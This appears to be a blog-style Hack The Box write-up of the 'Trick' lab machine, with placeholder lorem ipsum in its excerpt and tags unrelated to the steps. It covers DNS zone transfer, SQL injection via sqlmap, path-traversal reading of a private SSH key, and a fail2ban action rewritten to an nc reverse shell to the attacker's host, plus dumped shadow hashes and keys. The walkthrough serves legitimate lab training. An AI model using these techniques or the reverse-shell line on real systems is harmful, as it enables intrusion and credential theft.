---
layout: single
title: Trick - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2023-06-20
classes: wide
header:
  teaser: /assets/images/htb-writeup-trick/trick_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-trick/trick_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


# USER
### Step 1
**nmap:**
```bash
➜  trick nmap -Pn -n -p- -v 10.129.37.48
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http

➜  trick nmap -Pn -n 10.129.37.48 -sCV -p22,25,53,80   
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldnt establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


➜  trick sudo nmap -sU -v 10.129.37.48 -Pn --top-port=100
PORT     STATE         SERVICE
53/udp   open          domain
68/udp   open|filtered dhcpc
631/udp  open|filtered ipp
5353/udp open|filtered zeroconf
```

**zone transfer**:
```bash
➜  trick host -t axfr trick.htb 10.129.37.48
Trying "trick.htb"
Using domain server:
Name: 10.129.37.48
Address: 10.129.37.48#53
Aliases: 

;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 33770
;; flags: qr aa; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;trick.htb.			IN	AXFR

;; ANSWER SECTION:
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800

Received 192 bytes from 10.129.37.48#53 in 35 ms
```

----------------------
### Step 2
On `preprod-payroll.trick.htb` we find a login prompt, as seen in below picture.
![[Pasted image 20220620203513.png]]

However this seems likes it's most a front, as when fuzzing the site we get a lot of 200's.
```bash
➜  trick ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://preprod-payroll.trick.htb/FUZZ.php

ajax                    [Status: 200, Size: 0, Words: 1, Lines: 1]
db_connect              [Status: 200, Size: 0, Words: 1, Lines: 1]
department              [Status: 200, Size: 4844, Words: 244, Lines: 179]
employee                [Status: 200, Size: 2717, Words: 74, Lines: 96]
header                  [Status: 200, Size: 2548, Words: 145, Lines: 46]
home                    [Status: 200, Size: 486, Words: 180, Lines: 27]
index                   [Status: 302, Size: 9546, Words: 1453, Lines: 267]
login                   [Status: 200, Size: 5571, Words: 374, Lines: 177]
navbar                  [Status: 200, Size: 1382, Words: 68, Lines: 24]
payroll                 [Status: 200, Size: 3142, Words: 86, Lines: 111]
position                [Status: 200, Size: 5549, Words: 260, Lines: 196]
users                   [Status: 200, Size: 2197, Words: 103, Lines: 81]
```

Go to `/users.php` and we find the Administrator username, `Enemigosss`.
![[Pasted image 20220620203715.png]]

We don't have any password yet, and trying a quick spray doesn't bite. Instead we look to SQL Injection and we find something interesting. 

![[Pasted image 20220620204417.png]]

Quickly test it out with `sqlmap`:
```bash
➜  trick sqlmap -r sql-injection.txt
[... snip ...]
[20:55:21] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)

➜  trick sqlmap -r sql-injection.txt -dbs
[... snip ...]
[*] information_schema
[*] payroll_db

➜  trick sqlmap -r sql-injection.txt -D payroll_db -T users -C username,password --dump
[... snip ...]
Database: payroll_db
Table: users
[1 entry]
+------------+-----------------------+
| username   | password              |
+------------+-----------------------+
| Enemigosss | SuperGucciRainbowCake |
+------------+-----------------------+
```

We're now able to login to the web application, but there isn't anything obvious at first glance. We find some information about employee `Smith, John C`, but I'm not able to do anything with that information. Trying different user combinations towards SSH all fails. 

---------------------
### Step 3

I firmly believe we've milked this resource and need to find a new source, so lets continue fuzzing for more vhosts.

```bash
➜  trick ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://trick.htb -H "Host: preprod-FUZZ.trick.htb" -fs 5480
[... snip ...]
marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179]
payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267]
```

The marketing site seems to be similar to payroll, where the data is presented through the `page` url parameter.
Trying some standard Burp LFI lists and we get one match! We're able to read `/etc/hosts`

![[Pasted image 20220620215128.png]]

Send the request to the `repeater` and grab `/etc/passwd` to find valid users.

![[Pasted image 20220620215300.png]]

User `michael` seems like our guy! Note that he has UID 1001, and 1000 is no where to be seen - interesting! Look if michael has an `id_rsa` we can steal.

**Request:**
```bash
GET /index.php?page=%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fhome%2fmichael%2f.ssh%2fid_rsa HTTP/1.1
Host: preprod-marketing.trick.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://preprod-marketing.trick.htb/index.php?page=contact.html
Upgrade-Insecure-Requests: 1
```

**Response:**
```bash
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Mon, 20 Jun 2022 19:54:38 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1823

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Login and grab ``user.txt``:
```bash
➜  trick ssh michael@10.129.37.48 -i michael-id_rsa 
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$ id && hostname && cat user.txt 
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
trick
6c4275462016ada1fe28be5396666965
```

**NOTE:** Michael is a part of group `security`

----------------

# ROOT
### Step 1
Enumerate the user space and see if we find anything sensitive.

**Sudo -l:**
```bash
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

**DB Password:**
```bash
michael@trick:/var/www/payroll$ cat db_connect.php
<?php 

$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));
```

Lets start look into fail2ban. Looking in the directory we see that `action.d` is owned by group `securtiy`, which michael is part of - awesome! 

```bash
michael@trick:/etc/fail2ban$ ls -al
total 76
drwxr-xr-x   6 root root      4096 Jun 20 22:09 .
drwxr-xr-x 126 root root     12288 Jun 20 21:59 ..
drwxrwx---   2 root security  4096 Jun 20 22:09 action.d
-rw-r--r--   1 root root      2334 Jun 20 22:09 fail2ban.conf
drwxr-xr-x   2 root root      4096 Jun 20 22:09 fail2ban.d
drwxr-xr-x   3 root root      4096 Jun 20 22:09 filter.d
-rw-r--r--   1 root root     22908 Jun 20 22:09 jail.conf
drwxr-xr-x   2 root root      4096 Jun 20 22:09 jail.d
-rw-r--r--   1 root root       645 Jun 20 22:09 paths-arch.conf
-rw-r--r--   1 root root      2827 Jun 20 22:09 paths-common.conf
-rw-r--r--   1 root root       573 Jun 20 22:09 paths-debian.conf
-rw-r--r--   1 root root       738 Jun 20 22:09 paths-opensuse.conf
```

The services using fail2ban is located in directory `jail.d`:
```bash
michael@trick:/etc/fail2ban$ ls -al jail.d
total 12
drwxr-xr-x 2 root root 4096 Jun 20 22:12 .
drwxr-xr-x 6 root root 4096 Jun 20 22:12 ..
-rw-r--r-- 1 root root   22 Jun 20 22:12 defaults-debian.conf

michael@trick:/etc/fail2ban$ cat jail.d/defaults-debian.conf 
[sshd]
enabled = true
```

Since there are no more options than just "ssh", this means that default values from `jail.conf` will be used:
```bash
michael@trick:/etc/fail2ban$ less jail.conf 
[DEFAULT]

[... snip ...]

# "bantime" is the number of seconds that a host is banned.
bantime  = 10s

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10s

# "maxretry" is the number of failures before a host get banned.
maxretry = 5
```

Our group, `security`, owns `action.d` however that doesn't make us able to edit the config file. BUT we can delete the original file and replace it with a custom malicious one. The service needs to be restarted for any new actions to take place, hence we're able to run the command `sudo /etc/init.d/fail2ban restart` as user michael.

**Default Action:**
```bash
michael@trick:/etc/fail2ban$ cat /etc/fail2ban/action.d/iptables-multiport.conf
[... snip ...]
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
```

**Malicious Action:**
```bash
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf /tmp/
michael@trick:/etc/fail2ban/action.d$ cat /tmp/iptables-multiport.conf
[... snip ...]
actionban = /usr/bin/nc 10.10.15.1 4488 -e /bin/bash
```

Delete the original file, copy over the malicious, trigger the ban with hydra and get the reverse shell as root. 
```bash
michael@trick:/etc/fail2ban$ rm action.d/iptables-multiport.conf
rm: remove write-protected regular file 'action.d/iptables-multiport.conf'? y
michael@trick:/etc/fail2ban$ cp /tmp/iptables-multiport.conf action.d/iptables-multiport.conf
michael@trick:/etc/fail2ban$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

```bash
➜  trick hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://10.129.37.48 -vV
```

```bash
➜  trick nc -lvnp 4488
listening on [any] 4488 ...
connect to [10.10.15.1] from (UNKNOWN) [10.129.37.48] 38994
id 
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
395ca4e650fa0df53f1428253feb8b57

cat /etc/shadow
root:$6$lbBzS2rUUVRa6Erd$u2u317eVZBZgdCrT2HViYv.69vxazyKjAuVETHTpTpD42H0RDPQIbsCHwPdKqBQphI/FOmpEt3lgD9QBsu6nU1:19104:0:99999:7:::
michael:$6$SPev7eFL5z0aKFf0$5iLTl9egsGGePEPUnNJlFyw8HHvTwqVC3/THKzW2YD5ZPnbkN7pSOeOkXe9uiUHfOJegJdYT0j3Z9pz.FSX2y0:19104:0:99999:7:::

cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAoSBXc6x1gauygp8zl8Y13QXTwj633MsMv/0YsBzmGiHb1xBadkGC
6a0abDxM4UycoYN82sT7N732cJqL9mWK7ZeGPQX4+RHD0fQnVQY3KCYak7RxQQtilsErhG
VgovwAtnbaKA+tlfsO7IlD3Mv6lbJ/ElD9drwhJOVdEf4IL+8SstVgd0AehVQgnLXd58MK
7tuKX+a/+eBBjzfpA6hWIzTT3koLnMoTWe5uCuhIJiaBUQyvrBQ1C/M4E7rnHw6Rgh9x9d
1LPInu0NMxbw0LAuFaQRcz3ewzEt8M2d639vedwahK5MyuTQS/ZTt33yjoas40kv+NZ5Y0
5vVeP6XxcwAAA8jXOo441zqOOAAAAAdzc2gtcnNhAAABAQChIFdzrHWBq7KCnzOXxjXdBd
PCPrfcywy//RiwHOYaIdvXEFp2QYLprRpsPEzhTJyhg3zaxPs3vfZwmov2ZYrtl4Y9Bfj5
EcPR9CdVBjcoJhqTtHFBC2KWwSuEZWCi/AC2dtooD62V+w7siUPcy/qVsn8SUP12vCEk5V
0R/ggv7xKy1WB3QB6FVCCctd3nwwru24pf5r/54EGPN+kDqFYjNNPeSgucyhNZ7m4K6Egm
JoFRDK+sFDUL8zgTuucfDpGCH3H13Us8ie7Q0zFvDQsC4VpBFzPd7DMS3wzZ3rf2953BqE
rkzK5NBL9lO3ffKOhqzjSS/41nljTm9V4/pfFzAAAAAwEAAQAAAQEAkxF9ITUZ8GjywC1m
HzOpOHu4JIWwtxSTJ65x2VYXZWTgT7Y6i9QSFQ6OnpqPpdmS4g2tadYAY4m9plw6QoW+wE
zdF1gbP+RKM5pCSGYq9DeLbKR392HX9DiPawJJqZqRX/qt94EP9WS544cK7T82E2tgdyx7
nePr8Mx2HhUcDfsbxQlRbM9oKqIBQ0v9GdBotvi+Ri/IQfpEpmS64cU450/DlrwQ358MU9
i8so0KlnAHLYxgzhEzPjPehaRShcsRdhasw1/xVKk7PoBvXzz9r+Ywo5b2htiYzqxt5N5i
E8UOrUeYb7G21QjuhKB9KerukyGeHdBPjqvYuYjTwf2dUQAAAIEAnSUxZdekVLY0IoYPBF
DBDIMkk97Kq2v8H51L9Q0rKBs79x4ZaV56LfMnTxuAxwnUMUauyPeGZFDgVsFwg0JK+vbR
Kj9idBoMTOuDdfTE4IJtT3tEKClzFS9YSrYdQ78OUu8Kip3p5OuWfrzTuhRCKZ2cwd86WU
ghEBWtHhn/2RsAAACBANHocGFZWWM1DGtA3ZXiytuJLh7D55NUPk7jumm+qcF7UUiKaRHA
QnQ44oxHssJbkGi4S3tvfSlXFtNboQCt3q5Wgc3wl4S+sBGoq1xsZuXAz/3QX2AjXSpN/S
PkO+h4pk25aAFjGmAMMoH1Ty9v2X8ahYRY5EV8Y/LRcMF32Z5rAAAAgQDEgb1hc85TS0Wz
pmGTto+ok3eI/10wxgbZXtdki7Jn1npNI5S7lh0r76jqEn5edcIYlwcUV+b6dCucDUhUHl
7VT/uoy+BKbanLzM809KCnuLCM7LDISk4N/S79xiuFlrk11MrV2qaxZANiYEkOd1jKRGPi
UDRYRn2lPX7WiLyrGQAAAApyb290QHRyaWNrAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```